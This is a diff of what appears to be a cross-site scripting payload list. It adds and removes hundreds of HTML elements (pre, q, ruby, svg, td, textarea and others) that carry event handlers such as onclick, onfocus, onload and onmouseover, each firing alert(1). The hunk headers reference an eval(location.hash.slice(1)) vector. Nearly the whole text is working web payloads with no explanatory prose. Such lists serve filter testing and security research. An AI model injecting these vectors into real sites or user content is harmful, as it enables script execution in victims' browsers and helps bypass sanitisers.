-<pre id=x tabindex=1 onfocus=alert(1)></pre>
-<pre id=x tabindex=1 onfocusin=alert(1)></pre>
 <pre onclick="alert(1)">test</pre>
-<pre oncontextmenu="alert(1)">test</pre>
-<pre oncopy="alert(1)" contenteditable>test</pre>
-<pre oncut="alert(1)" contenteditable>test</pre>
 <pre ondblclick="alert(1)">test</pre>
 <pre onmousedown="alert(1)">test</pre>
 <pre onmouseenter="alert(1)">test</pre>
@@ -1372,29 +471,9 @@ eval(location.hash.slice(1)>#alert(1)
 <pre onmouseout="alert(1)">test</pre>
 <pre onmouseover="alert(1)">test</pre>
 <pre onmouseup="alert(1)">test</pre>
-<progress onclick="alert(1)">test</progress>
-<progress ondblclick="alert(1)">test</progress>
-<progress onmousedown="alert(1)">test</progress>
-<progress onmouseenter="alert(1)">test</progress>
-<progress onmouseleave="alert(1)">test</progress>
-<progress onmousemove="alert(1)">test</progress>
-<progress onmouseout="alert(1)">test</progress>
-<progress onmouseover="alert(1)">test</progress>
-<progress onmouseup="alert(1)">test</progress>
-<q draggable="true" ondrag="alert(1)">test</q>
-<q draggable="true" ondragend="alert(1)">test</q>
-<q id=x tabindex=1 onactivate=alert(1)></q>
-<q id=x tabindex=1 onbeforeactivate=alert(1)></q>
-<q id=x tabindex=1 onfocus=alert(1)></q>
-<q id=x tabindex=1 onfocusin=alert(1)></q>
 <q onclick="alert(1)">test</q>
 <q oncontextmenu="alert(1)">test</q>
-<q oncopy="alert(1)" contenteditable>test</q>
-<q oncut="alert(1)" contenteditable>test</q>
 <q ondblclick="alert(1)">test</q>
-<q onkeydown="alert(1)" contenteditable>test</q>
-<q onkeypress="alert(1)" contenteditable>test</q>
-<q onkeyup="alert(1)" contenteditable>test</q>
 <q onmousedown="alert(1)">test</q>
 <q onmouseenter="alert(1)">test</q>
 <q onmouseleave="alert(1)">test</q>
@@ -1402,17 +481,9 @@ eval(location.hash.slice(1)>#alert(1)
 <q onmouseout="alert(1)">test</q>
 <q onmouseover="alert(1)">test</q>
 <q onmouseup="alert(1)">test</q>
-<q onpaste="alert(1)" contenteditable>test</q>
-<rb draggable="true" ondrag="alert(1)">test</rb>
-<rb id=x tabindex=1 onactivate=alert(1)></rb>
-<rb id=x tabindex=1 onfocus=alert(1)></rb>
-<rb id=x tabindex=1 onfocusin=alert(1)></rb>
 <rb onclick="alert(1)">test</rb>
 <rb oncontextmenu="alert(1)">test</rb>
-<rb oncopy="alert(1)" contenteditable>test</rb>
-<rb oncut="alert(1)" contenteditable>test</rb>
 <rb ondblclick="alert(1)">test</rb>
-<rb onkeyup="alert(1)" contenteditable>test</rb>
 <rb onmousedown="alert(1)">test</rb>
 <rb onmouseenter="alert(1)">test</rb>
 <rb onmouseleave="alert(1)">test</rb>
@@ -1420,17 +491,9 @@ eval(location.hash.slice(1)>#alert(1)
 <rb onmouseout="alert(1)">test</rb>
 <rb onmouseover="alert(1)">test</rb>
 <rb onmouseup="alert(1)">test</rb>
-<rb onpaste="alert(1)" contenteditable>test</rb>
-<rp draggable="true" ondrag="alert(1)">test</rp>
-<rp id=x tabindex=1 onactivate=alert(1)></rp>
-<rp id=x tabindex=1 onfocus=alert(1)></rp>
-<rp id=x tabindex=1 onfocusin=alert(1)></rp>
 <rp onclick="alert(1)">test</rp>
 <rp oncontextmenu="alert(1)">test</rp>
-<rp oncopy="alert(1)" contenteditable>test</rp>
-<rp oncut="alert(1)" contenteditable>test</rp>
 <rp ondblclick="alert(1)">test</rp>
-<rp onkeyup="alert(1)" contenteditable>test</rp>
 <rp onmousedown="alert(1)">test</rp>
 <rp onmouseenter="alert(1)">test</rp>
 <rp onmouseleave="alert(1)">test</rp>
@@ -1438,17 +501,9 @@ eval(location.hash.slice(1)>#alert(1)
 <rp onmouseout="alert(1)">test</rp>
 <rp onmouseover="alert(1)">test</rp>
 <rp onmouseup="alert(1)">test</rp>
-<rp onpaste="alert(1)" contenteditable>test</rp>
-<rt draggable="true" ondrag="alert(1)">test</rt>
-<rt id=x tabindex=1 onactivate=alert(1)></rt>
-<rt id=x tabindex=1 onfocus=alert(1)></rt>
-<rt id=x tabindex=1 onfocusin=alert(1)></rt>
 <rt onclick="alert(1)">test</rt>
 <rt oncontextmenu="alert(1)">test</rt>
-<rt oncopy="alert(1)" contenteditable>test</rt>
-<rt oncut="alert(1)" contenteditable>test</rt>
 <rt ondblclick="alert(1)">test</rt>
-<rt onkeyup="alert(1)" contenteditable>test</rt>
 <rt onmousedown="alert(1)">test</rt>
 <rt onmouseenter="alert(1)">test</rt>
 <rt onmouseleave="alert(1)">test</rt>
@@ -1456,14 +511,7 @@ eval(location.hash.slice(1)>#alert(1)
 <rt onmouseout="alert(1)">test</rt>
 <rt onmouseover="alert(1)">test</rt>
 <rt onmouseup="alert(1)">test</rt>
-<rt onpaste="alert(1)" contenteditable>test</rt>
-<rtc id=x tabindex=1 onactivate=alert(1)></rtc>
-<rtc id=x tabindex=1 onfocus=alert(1)></rtc>
-<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>
 <rtc onclick="alert(1)">test</rtc>
-<rtc oncontextmenu="alert(1)">test</rtc>
-<rtc oncopy="alert(1)" contenteditable>test</rtc>
-<rtc oncut="alert(1)" contenteditable>test</rtc>
 <rtc ondblclick="alert(1)">test</rtc>
 <rtc onmousedown="alert(1)">test</rtc>
 <rtc onmouseenter="alert(1)">test</rtc>
@@ -1472,33 +520,13 @@ eval(location.hash.slice(1)>#alert(1)
 <rtc onmouseout="alert(1)">test</rtc>
 <rtc onmouseover="alert(1)">test</rtc>
 <rtc onmouseup="alert(1)">test</rtc>
-<ruby id=x tabindex=1 onactivate=alert(1)></ruby>
-<ruby id=x tabindex=1 onfocus=alert(1)></ruby>
-<ruby id=x tabindex=1 onfocusin=alert(1)></ruby>
 <ruby onclick="alert(1)">test</ruby>
-<ruby oncontextmenu="alert(1)">test</ruby>
 <ruby ondblclick="alert(1)">test</ruby>
-<ruby onmousedown="alert(1)">test</ruby>
-<ruby onmouseenter="alert(1)">test</ruby>
-<ruby onmouseleave="alert(1)">test</ruby>
-<ruby onmousemove="alert(1)">test</ruby>
 <ruby onmouseout="alert(1)">test</ruby>
-<ruby onmouseover="alert(1)">test</ruby>
 <ruby onmouseup="alert(1)">test</ruby>
-<s draggable="true" ondrag="alert(1)">test</s>
-<s draggable="true" ondragend="alert(1)">test</s>
-<s id=x tabindex=1 onactivate=alert(1)></s>
-<s id=x tabindex=1 onbeforeactivate=alert(1)></s>
-<s id=x tabindex=1 onfocus=alert(1)></s>
-<s id=x tabindex=1 onfocusin=alert(1)></s>
 <s onclick="alert(1)">test</s>
 <s oncontextmenu="alert(1)">test</s>
-<s oncopy="alert(1)" contenteditable>test</s>
-<s oncut="alert(1)" contenteditable>test</s>
 <s ondblclick="alert(1)">test</s>
-<s onkeydown="alert(1)" contenteditable>test</s>
-<s onkeypress="alert(1)" contenteditable>test</s>
-<s onkeyup="alert(1)" contenteditable>test</s>
 <s onmousedown="alert(1)">test</s>
 <s onmouseenter="alert(1)">test</s>
 <s onmouseleave="alert(1)">test</s>
@@ -1506,162 +534,24 @@ eval(location.hash.slice(1)>#alert(1)
 <s onmouseout="alert(1)">test</s>
 <s onmouseover="alert(1)">test</s>
 <s onmouseup="alert(1)">test</s>
-<s onpaste="alert(1)" contenteditable>test</s>
-<samp id=x tabindex=1 onactivate=alert(1)></samp>
-<samp id=x tabindex=1 onfocus=alert(1)></samp>
-<samp id=x tabindex=1 onfocusin=alert(1)></samp>
 <samp onclick="alert(1)">test</samp>
-<samp oncontextmenu="alert(1)">test</samp>
 <samp ondblclick="alert(1)">test</samp>
-<samp onmousedown="alert(1)">test</samp>
-<samp onmouseenter="alert(1)">test</samp>
-<samp onmouseleave="alert(1)">test</samp>
-<samp onmousemove="alert(1)">test</samp>
 <samp onmouseout="alert(1)">test</samp>
-<samp onmouseover="alert(1)">test</samp>
 <samp onmouseup="alert(1)">test</samp>
-<script onclick="alert(1)">test</script>
-<script oncontextmenu="alert(1)">test</script>
-<script ondblclick="alert(1)">test</script>
-<script onerror=alert(1) src=/></script>
-<script onload=alert(1) src=validjs.js></script>
-<script onmousedown="alert(1)">test</script>
-<script onmouseenter="alert(1)">test</script>
-<script onmouseleave="alert(1)">test</script>
-<script onmousemove="alert(1)">test</script>
-<script onmouseout="alert(1)">test</script>
-<script onmouseover="alert(1)">test</script>
-<script onmouseup="alert(1)">test</script>
-<script onreadystatechange=alert(1)></script>
-<section onclick="alert(1)">test</section>
-<section oncontextmenu="alert(1)">test</section>
-<section ondblclick="alert(1)">test</section>
-<section onmousedown="alert(1)">test</section>
-<section onmouseenter="alert(1)">test</section>
-<section onmouseleave="alert(1)">test</section>
-<section onmousemove="alert(1)">test</section>
-<section onmouseout="alert(1)">test</section>
-<section onmouseover="alert(1)">test</section>
-<section onmouseup="alert(1)">test</section>
 <select autofocus onfocus=alert(1)>
 <select autofocus onfocusin=alert(1)>
-<select onclick="alert(1)">test</select>
-<select oncontextmenu="alert(1)">test</select>
-<select ondblclick="alert(1)">test</select>
-<select onmousedown="alert(1)">test</select>
-<select onmouseenter="alert(1)">test</select>
-<select onmouseleave="alert(1)">test</select>
-<select onmousemove="alert(1)">test</select>
-<select onmouseout="alert(1)">test</select>
-<select onmouseover="alert(1)">test</select>
-<select onmouseup="alert(1)">test</select>
-<shadow onclick="alert(1)">test</shadow>
-<shadow oncontextmenu="alert(1)">test</shadow>
-<shadow ondblclick="alert(1)">test</shadow>
-<shadow onmousedown="alert(1)">test</shadow>
-<shadow onmouseenter="alert(1)">test</shadow>
-<shadow onmouseleave="alert(1)">test</shadow>
-<shadow onmousemove="alert(1)">test</shadow>
-<shadow onmouseout="alert(1)">test</shadow>
-<shadow onmouseover="alert(1)">test</shadow>
-<shadow onmouseup="alert(1)">test</shadow>
-<slot id=x tabindex=1 onactivate=alert(1)></slot>
-<slot id=x tabindex=1 onfocus=alert(1)></slot>
-<slot id=x tabindex=1 onfocusin=alert(1)></slot>
 <slot onclick="alert(1)">test</slot>
-<slot oncontextmenu="alert(1)">test</slot>
 <slot ondblclick="alert(1)">test</slot>
-<slot onmousedown="alert(1)">test</slot>
-<slot onmouseenter="alert(1)">test</slot>
-<slot onmouseleave="alert(1)">test</slot>
-<slot onmousemove="alert(1)">test</slot>
 <slot onmouseout="alert(1)">test</slot>
-<slot onmouseover="alert(1)">test</slot>
 <slot onmouseup="alert(1)">test</slot>
-<small id=x tabindex=1 onfocus=alert(1)></small>
 <small onclick="alert(1)">test</small>
-<small oncontextmenu="alert(1)">test</small>
-<small ondblclick="alert(1)">test</small>
-<small onmousedown="alert(1)">test</small>
-<small onmouseenter="alert(1)">test</small>
-<small onmouseleave="alert(1)">test</small>
-<small onmousemove="alert(1)">test</small>
-<small onmouseout="alert(1)">test</small>
-<small onmouseover="alert(1)">test</small>
-<small onmouseup="alert(1)">test</small>
-<source onclick="alert(1)">test</source>
-<source oncontextmenu="alert(1)">test</source>
-<source ondblclick="alert(1)">test</source>
-<source onmousedown="alert(1)">test</source>
-<source onmouseenter="alert(1)">test</source>
-<source onmouseleave="alert(1)">test</source>
-<source onmousemove="alert(1)">test</source>
-<source onmouseout="alert(1)">test</source>
-<source onmouseover="alert(1)">test</source>
-<source onmouseup="alert(1)">test</source>
-<spacer onclick="alert(1)">test</spacer>
-<spacer oncontextmenu="alert(1)">test</spacer>
-<spacer ondblclick="alert(1)">test</spacer>
-<spacer onmousedown="alert(1)">test</spacer>
-<spacer onmouseenter="alert(1)">test</spacer>
-<spacer onmouseleave="alert(1)">test</spacer>
-<spacer onmousemove="alert(1)">test</spacer>
-<spacer onmouseout="alert(1)">test</spacer>
-<spacer onmouseover="alert(1)">test</spacer>
-<spacer onmouseup="alert(1)">test</spacer>
-<span id=x tabindex=1 onactivate=alert(1)></span>
-<span id=x tabindex=1 onfocus=alert(1)></span>
-<span id=x tabindex=1 onfocusin=alert(1)></span>
 <span onclick="alert(1)">test</span>
-<span oncontextmenu="alert(1)">test</span>
 <span ondblclick="alert(1)">test</span>
-<span onmousedown="alert(1)">test</span>
-<span onmouseenter="alert(1)">test</span>
-<span onmouseleave="alert(1)">test</span>
-<span onmousemove="alert(1)">test</span>
 <span onmouseout="alert(1)">test</span>
-<span onmouseover="alert(1)">test</span>
 <span onmouseup="alert(1)">test</span>
-<strike onclick="alert(1)">test</strike>
-<strike oncontextmenu="alert(1)">test</strike>
-<strike ondblclick="alert(1)">test</strike>
-<strike onmousedown="alert(1)">test</strike>
-<strike onmouseenter="alert(1)">test</strike>
-<strike onmouseleave="alert(1)">test</strike>
-<strike onmousemove="alert(1)">test</strike>
-<strike onmouseout="alert(1)">test</strike>
-<strike onmouseover="alert(1)">test</strike>
-<strike onmouseup="alert(1)">test</strike>
-<strong onclick="alert(1)">test</strong>
-<strong oncontextmenu="alert(1)">test</strong>
-<strong ondblclick="alert(1)">test</strong>
-<strong onmousedown="alert(1)">test</strong>
-<strong onmouseenter="alert(1)">test</strong>
-<strong onmouseleave="alert(1)">test</strong>
-<strong onmousemove="alert(1)">test</strong>
-<strong onmouseout="alert(1)">test</strong>
-<strong onmouseover="alert(1)">test</strong>
-<strong onmouseup="alert(1)">test</strong>
-<style id=x tabindex=1 onfocus=alert(1)></style>
 <style onclick="alert(1)">test</style>
-<style oncontextmenu="alert(1)">test</style>
-<style ondblclick="alert(1)">test</style>
 <style onload=alert(1)></style>
-<style onmousedown="alert(1)">test</style>
-<style onmouseenter="alert(1)">test</style>
-<style onmouseleave="alert(1)">test</style>
-<style onmousemove="alert(1)">test</style>
-<style onmouseout="alert(1)">test</style>
-<style onmouseover="alert(1)">test</style>
-<style onmouseup="alert(1)">test</style>
-<style onreadystatechange=alert(1)></style>
-<sub id=x tabindex=1 onactivate=alert(1)></sub>
-<sub id=x tabindex=1 onfocus=alert(1)></sub>
-<sub id=x tabindex=1 onfocusin=alert(1)></sub>
 <sub onclick="alert(1)">test</sub>
-<sub oncontextmenu="alert(1)">test</sub>
-<sub oncopy="alert(1)" contenteditable>test</sub>
-<sub oncut="alert(1)" contenteditable>test</sub>
 <sub ondblclick="alert(1)">test</sub>
 <sub onmousedown="alert(1)">test</sub>
 <sub onmouseenter="alert(1)">test</sub>
@@ -1670,23 +560,7 @@ eval(location.hash.slice(1)>#alert(1)
 <sub onmouseout="alert(1)">test</sub>
 <sub onmouseover="alert(1)">test</sub>
 <sub onmouseup="alert(1)">test</sub>
-<summary onclick="alert(1)">test</summary>
-<summary oncontextmenu="alert(1)">test</summary>
-<summary ondblclick="alert(1)">test</summary>
-<summary onmousedown="alert(1)">test</summary>
-<summary onmouseenter="alert(1)">test</summary>
-<summary onmouseleave="alert(1)">test</summary>
-<summary onmousemove="alert(1)">test</summary>
-<summary onmouseout="alert(1)">test</summary>
-<summary onmouseover="alert(1)">test</summary>
-<summary onmouseup="alert(1)">test</summary>
-<sup id=x tabindex=1 onactivate=alert(1)></sup>
-<sup id=x tabindex=1 onfocus=alert(1)></sup>
-<sup id=x tabindex=1 onfocusin=alert(1)></sup>
 <sup onclick="alert(1)">test</sup>
-<sup oncontextmenu="alert(1)">test</sup>
-<sup oncopy="alert(1)" contenteditable>test</sup>
-<sup oncut="alert(1)" contenteditable>test</sup>
 <sup ondblclick="alert(1)">test</sup>
 <sup onmousedown="alert(1)">test</sup>
 <sup onmouseenter="alert(1)">test</sup>
@@ -1697,11 +571,7 @@ eval(location.hash.slice(1)>#alert(1)
 <sup onmouseup="alert(1)">test</sup>
 <svg id=x onfocus=alert(1)>
 <svg id=x onfocusin=alert(1)>
-<svg id=x tabindex=1 onactivate=alert(1)></svg>
 <svg onclick="alert(1)">test</svg>
-<svg oncontextmenu="alert(1)">test</svg>
-<svg oncopy="alert(1)" contenteditable>test</svg>
-<svg oncut="alert(1)" contenteditable>test</svg>
 <svg ondblclick="alert(1)">test</svg>
 <svg onload=alert(1)>
 <svg onmousedown="alert(1)">test</svg>
@@ -1711,41 +581,28 @@ eval(location.hash.slice(1)>#alert(1)
 <svg onmouseout="alert(1)">test</svg>
 <svg onmouseover="alert(1)">test</svg>
 <svg onmouseup="alert(1)">test</svg>
-<svg onunload=window.open('javascript:alert(1)')>
 <svg><a onload=alert(1)></a>
 <svg><abbr onload=alert(1)></abbr>
-<svg><acronym onload=alert(1)></acronym>
-<svg><address onload=alert(1)></address>
 <svg><applet onload=alert(1)></applet>
 <svg><area onload=alert(1)></area>
-<svg><article onload=alert(1)></article>
 <svg><aside onload=alert(1)></aside>
 <svg><audio onload=alert(1)></audio>
 <svg><b onload=alert(1)></b>
 <svg><base onload=alert(1)></base>
-<svg><basefont onload=alert(1)></basefont>
 <svg><bdi onload=alert(1)></bdi>
 <svg><bdo onload=alert(1)></bdo>
-<svg><bgsound onload=alert(1)></bgsound>
 <svg><big onload=alert(1)></big>
 <svg><blink onload=alert(1)></blink>
-<svg><blockquote onload=alert(1)></blockquote>
 <svg><br onload=alert(1)></br>
 <svg><button onload=alert(1)></button>
 <svg><canvas onload=alert(1)></canvas>
-<svg><caption onload=alert(1)></caption>
 <svg><center onload=alert(1)></center>
 <svg><cite onload=alert(1)></cite>
 <svg><code onload=alert(1)></code>
 <svg><col onload=alert(1)></col>
-<svg><colgroup onload=alert(1)></colgroup>
-<svg><command onload=alert(1)></command>
-<svg><content onload=alert(1)></content>
 <svg><data onload=alert(1)></data>
-<svg><datalist onload=alert(1)></datalist>
 <svg><dd onload=alert(1)></dd>
 <svg><del onload=alert(1)></del>
-<svg><details onload=alert(1)></details>
 <svg><dfn onload=alert(1)></dfn>
 <svg><dialog onload=alert(1)></dialog>
 <svg><dir onload=alert(1)></dir>
@@ -1753,15 +610,11 @@ eval(location.hash.slice(1)>#alert(1)
 <svg><div onload=alert(1)></div>
 <svg><dl onload=alert(1)></dl>
 <svg><dt onload=alert(1)></dt>
-<svg><element onload=alert(1)></element>
 <svg><em onload=alert(1)></em>
-<svg><fieldset onload=alert(1)></fieldset>
-<svg><figcaption onload=alert(1)></figcaption>
 <svg><figure onload=alert(1)></figure>
 <svg><font onload=alert(1)></font>
 <svg><footer onload=alert(1)></footer>
 <svg><form onload=alert(1)></form>
-<svg><frameset onload=alert(1)></frameset>
 <svg><h1 onload=alert(1)></h1>
 <svg><head onload=alert(1)></head>
 <svg><header onload=alert(1)></header>
@@ -1770,39 +623,27 @@ eval(location.hash.slice(1)>#alert(1)
 <svg><html onload=alert(1)></html>
 <svg><i onload=alert(1)></i>
 <svg><image href=1 onerror=alert(1)>
-<svg><image href=validimage.png onload=alert(1)>
 <svg><ins onload=alert(1)></ins>
 <svg><kbd onload=alert(1)></kbd>
 <svg><keygen onload=alert(1)></keygen>
 <svg><label onload=alert(1)></label>
 <svg><legend onload=alert(1)></legend>
 <svg><li onload=alert(1)></li>
-<svg><listing onload=alert(1)></listing>
 <svg><main onload=alert(1)></main>
 <svg><map onload=alert(1)></map>
 <svg><mark onload=alert(1)></mark>
-<svg><marquee onload=alert(1)></marquee>
 <svg><menu onload=alert(1)></menu>
-<svg><menuitem onload=alert(1)></menuitem>
 <svg><meta onload=alert(1)></meta>
 <svg><meter onload=alert(1)></meter>
-<svg><multicol onload=alert(1)></multicol>
 <svg><nav onload=alert(1)></nav>
 <svg><nextid onload=alert(1)></nextid>
 <svg><nobr onload=alert(1)></nobr>
-<svg><noembed onload=alert(1)></noembed>
-<svg><noframes onload=alert(1)></noframes>
-<svg><noscript onload=alert(1)></noscript>
 <svg><ol onload=alert(1)></ol>
-<svg><optgroup onload=alert(1)></optgroup>
 <svg><option onload=alert(1)></option>
 <svg><output onload=alert(1)></output>
 <svg><p onload=alert(1)></p>
 <svg><param onload=alert(1)></param>
-<svg><picture onload=alert(1)></picture>
-<svg><plaintext onload=alert(1)></plaintext>
 <svg><pre onload=alert(1)></pre>
-<svg><progress onload=alert(1)></progress>
 <svg><q onload=alert(1)></q>
 <svg><rb onload=alert(1)></rb>
 <svg><rp onload=alert(1)></rp>
@@ -1811,9 +652,7 @@ eval(location.hash.slice(1)>#alert(1)
 <svg><ruby onload=alert(1)></ruby>
 <svg><s onload=alert(1)></s>
 <svg><samp onload=alert(1)></samp>
-<svg><section onload=alert(1)></section>
 <svg><select onload=alert(1)></select>
-<svg><set onend=alert(1) attributename=x dur=1s>
 <svg><shadow onload=alert(1)></shadow>
 <svg><slot onload=alert(1)></slot>
 <svg><small onload=alert(1)></small>
@@ -1823,13 +662,10 @@ eval(location.hash.slice(1)>#alert(1)
 <svg><strike onload=alert(1)></strike>
 <svg><strong onload=alert(1)></strong>
 <svg><sub onload=alert(1)></sub>
-<svg><summary onload=alert(1)></summary>
 <svg><sup onload=alert(1)></sup>
 <svg><table onload=alert(1)></table>
 <svg><tbody onload=alert(1)></tbody>
 <svg><td onload=alert(1)></td>
-<svg><template onload=alert(1)></template>
-<svg><textarea onload=alert(1)></textarea>
 <svg><tfoot onload=alert(1)></tfoot>
 <svg><th onload=alert(1)></th>
 <svg><thead onload=alert(1)></thead>
@@ -1844,38 +680,11 @@ eval(location.hash.slice(1)>#alert(1)
 <svg><wbr onload=alert(1)></wbr>
 <svg><xmp onload=alert(1)></xmp>
 <svg><xss onload=alert(1)></xss>
-<table id=x tabindex=1 onfocus=alert(1)></table>
 <table onclick="alert(1)">test</table>
-<table oncontextmenu="alert(1)">test</table>
-<table ondblclick="alert(1)">test</table>
-<table onmousedown="alert(1)">test</table>
-<table onmouseenter="alert(1)">test</table>
-<table onmouseleave="alert(1)">test</table>
-<table onmousemove="alert(1)">test</table>
-<table onmouseout="alert(1)">test</table>
-<table onmouseover="alert(1)">test</table>
-<table onmouseup="alert(1)">test</table>
-<tbody id=x tabindex=1 onfocus=alert(1)></tbody>
 <tbody onclick="alert(1)">test</tbody>
-<tbody oncontextmenu="alert(1)">test</tbody>
-<tbody ondblclick="alert(1)">test</tbody>
-<tbody onmousedown="alert(1)">test</tbody>
-<tbody onmouseenter="alert(1)">test</tbody>
-<tbody onmouseleave="alert(1)">test</tbody>
-<tbody onmousemove="alert(1)">test</tbody>
-<tbody onmouseout="alert(1)">test</tbody>
-<tbody onmouseover="alert(1)">test</tbody>
-<tbody onmouseup="alert(1)">test</tbody>
-<td draggable="true" ondrag="alert(1)">test</td>
-<td id=x tabindex=1 onactivate=alert(1)></td>
-<td id=x tabindex=1 onfocus=alert(1)></td>
-<td id=x tabindex=1 onfocusin=alert(1)></td>
 <td onclick="alert(1)">test</td>
 <td oncontextmenu="alert(1)">test</td>
-<td oncopy="alert(1)" contenteditable>test</td>
-<td oncut="alert(1)" contenteditable>test</td>
 <td ondblclick="alert(1)">test</td>
-<td onkeyup="alert(1)" contenteditable>test</td>
 <td onmousedown="alert(1)">test</td>
 <td onmouseenter="alert(1)">test</td>
 <td onmouseleave="alert(1)">test</td>
@@ -1883,51 +692,10 @@ eval(location.hash.slice(1)>#alert(1)
 <td onmouseout="alert(1)">test</td>
 <td onmouseover="alert(1)">test</td>
 <td onmouseup="alert(1)">test</td>
-<td onpaste="alert(1)" contenteditable>test</td>
-<template onclick="alert(1)">test</template>
-<template ondblclick="alert(1)">test</template>
-<template onmousedown="alert(1)">test</template>
-<template onmouseenter="alert(1)">test</template>
-<template onmouseleave="alert(1)">test</template>
-<template onmousemove="alert(1)">test</template>
-<template onmouseout="alert(1)">test</template>
-<template onmouseover="alert(1)">test</template>
-<template onmouseup="alert(1)">test</template>
-<textarea onauxclick=alert(1)>XSS</textarea>
-<textarea onchange=alert(1)>XSS</textarea>
-<textarea onclick="alert(1)">test</textarea>
-<textarea oncut=alert(1) autofocus>XSS</textarea>
-<textarea ondblclick="alert(1)">test</textarea>
-<textarea oninput=alert(1)>XSS</textarea>
-<textarea onmousedown="alert(1)">test</textarea>
-<textarea onmouseenter="alert(1)">test</textarea>
-<textarea onmouseleave="alert(1)">test</textarea>
-<textarea onmousemove="alert(1)">test</textarea>
-<textarea onmouseout="alert(1)">test</textarea>
-<textarea onmouseover="alert(1)">test</textarea>
-<textarea onmouseup="alert(1)">test</textarea>
-<textarea onpaste=alert(1) autofocus></textarea>
-<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>
 <tfoot onclick="alert(1)">test</tfoot>
-<tfoot oncontextmenu="alert(1)">test</tfoot>
-<tfoot ondblclick="alert(1)">test</tfoot>
-<tfoot onmousedown="alert(1)">test</tfoot>
-<tfoot onmouseenter="alert(1)">test</tfoot>
-<tfoot onmouseleave="alert(1)">test</tfoot>
-<tfoot onmousemove="alert(1)">test</tfoot>
-<tfoot onmouseout="alert(1)">test</tfoot>
-<tfoot onmouseover="alert(1)">test</tfoot>
-<tfoot onmouseup="alert(1)">test</tfoot>
-<th draggable="true" ondrag="alert(1)">test</th>
-<th id=x tabindex=1 onactivate=alert(1)></th>
-<th id=x tabindex=1 onfocus=alert(1)></th>
-<th id=x tabindex=1 onfocusin=alert(1)></th>
 <th onclick="alert(1)">test</th>
 <th oncontextmenu="alert(1)">test</th>
-<th oncopy="alert(1)" contenteditable>test</th>
-<th oncut="alert(1)" contenteditable>test</th>
 <th ondblclick="alert(1)">test</th>
-<th onkeyup="alert(1)" contenteditable>test</th>
 <th onmousedown="alert(1)">test</th>
 <th onmouseenter="alert(1)">test</th>
 <th onmouseleave="alert(1)">test</th>
@@ -1935,52 +703,15 @@ eval(location.hash.slice(1)>#alert(1)
 <th onmouseout="alert(1)">test</th>
 <th onmouseover="alert(1)">test</th>
 <th onmouseup="alert(1)">test</th>
-<th onpaste="alert(1)" contenteditable>test</th>
-<thead id=x tabindex=1 onfocus=alert(1)></thead>
 <thead onclick="alert(1)">test</thead>
-<thead oncontextmenu="alert(1)">test</thead>
-<thead ondblclick="alert(1)">test</thead>
-<thead onmousedown="alert(1)">test</thead>
-<thead onmouseenter="alert(1)">test</thead>
-<thead onmouseleave="alert(1)">test</thead>
-<thead onmousemove="alert(1)">test</thead>
-<thead onmouseout="alert(1)">test</thead>
-<thead onmouseover="alert(1)">test</thead>
-<thead onmouseup="alert(1)">test</thead>
-<time id=x tabindex=1 onactivate=alert(1)></time>
-<time id=x tabindex=1 onfocus=alert(1)></time>
-<time id=x tabindex=1 onfocusin=alert(1)></time>
 <time onclick="alert(1)">test</time>
-<time oncontextmenu="alert(1)">test</time>
 <time ondblclick="alert(1)">test</time>
-<time onmousedown="alert(1)">test</time>
-<time onmouseenter="alert(1)">test</time>
-<time onmouseleave="alert(1)">test</time>
-<time onmousemove="alert(1)">test</time>
 <time onmouseout="alert(1)">test</time>
-<time onmouseover="alert(1)">test</time>
 <time onmouseup="alert(1)">test</time>
-<title id=x tabindex=1 onfocus=alert(1)></title>
 <title onclick="alert(1)">test</title>
-<title oncontextmenu="alert(1)">test</title>
-<title ondblclick="alert(1)">test</title>
-<title onmousedown="alert(1)">test</title>
-<title onmouseenter="alert(1)">test</title>
-<title onmouseleave="alert(1)">test</title>
-<title onmousemove="alert(1)">test</title>
-<title onmouseout="alert(1)">test</title>
-<title onmouseover="alert(1)">test</title>
-<title onmouseup="alert(1)">test</title>
-<tr draggable="true" ondrag="alert(1)">test</tr>
-<tr id=x tabindex=1 onactivate=alert(1)></tr>
-<tr id=x tabindex=1 onfocus=alert(1)></tr>
-<tr id=x tabindex=1 onfocusin=alert(1)></tr>
 <tr onclick="alert(1)">test</tr>
 <tr oncontextmenu="alert(1)">test</tr>
-<tr oncopy="alert(1)" contenteditable>test</tr>
-<tr oncut="alert(1)" contenteditable>test</tr>
 <tr ondblclick="alert(1)">test</tr>
-<tr onkeyup="alert(1)" contenteditable>test</tr>
 <tr onmousedown="alert(1)">test</tr>
 <tr onmouseenter="alert(1)">test</tr>
 <tr onmouseleave="alert(1)">test</tr>
@@ -1988,28 +719,10 @@ eval(location.hash.slice(1)>#alert(1)
 <tr onmouseout="alert(1)">test</tr>
 <tr onmouseover="alert(1)">test</tr>
 <tr onmouseup="alert(1)">test</tr>
-<tr onpaste="alert(1)" contenteditable>test</tr>
-<track id=x tabindex=1 onfocus=alert(1)></track>
 <track onclick="alert(1)">test</track>
-<track oncontextmenu="alert(1)">test</track>
-<track ondblclick="alert(1)">test</track>
-<track onmousedown="alert(1)">test</track>
-<track onmouseenter="alert(1)">test</track>
-<track onmouseleave="alert(1)">test</track>
-<track onmousemove="alert(1)">test</track>
-<track onmouseout="alert(1)">test</track>
-<track onmouseover="alert(1)">test</track>
-<track onmouseup="alert(1)">test</track>
-<tt draggable="true" ondrag="alert(1)">test</tt>
-<tt id=x tabindex=1 onactivate=alert(1)></tt>
-<tt id=x tabindex=1 onfocus=alert(1)></tt>
-<tt id=x tabindex=1 onfocusin=alert(1)></tt>
 <tt onclick="alert(1)">test</tt>
 <tt oncontextmenu="alert(1)">test</tt>
-<tt oncopy="alert(1)" contenteditable>test</tt>
-<tt oncut="alert(1)" contenteditable>test</tt>
 <tt ondblclick="alert(1)">test</tt>
-<tt onkeyup="alert(1)" contenteditable>test</tt>
 <tt onmousedown="alert(1)">test</tt>
 <tt onmouseenter="alert(1)">test</tt>
 <tt onmouseleave="alert(1)">test</tt>
@@ -2017,21 +730,9 @@ eval(location.hash.slice(1)>#alert(1)
 <tt onmouseout="alert(1)">test</tt>
 <tt onmouseover="alert(1)">test</tt>
 <tt onmouseup="alert(1)">test</tt>
-<tt onpaste="alert(1)" contenteditable>test</tt>
-<u draggable="true" ondrag="alert(1)">test</u>
-<u draggable="true" ondragend="alert(1)">test</u>
-<u id=x tabindex=1 onactivate=alert(1)></u>
-<u id=x tabindex=1 onbeforeactivate=alert(1)></u>
-<u id=x tabindex=1 onfocus=alert(1)></u>
-<u id=x tabindex=1 onfocusin=alert(1)></u>
 <u onclick="alert(1)">test</u>
 <u oncontextmenu="alert(1)">test</u>
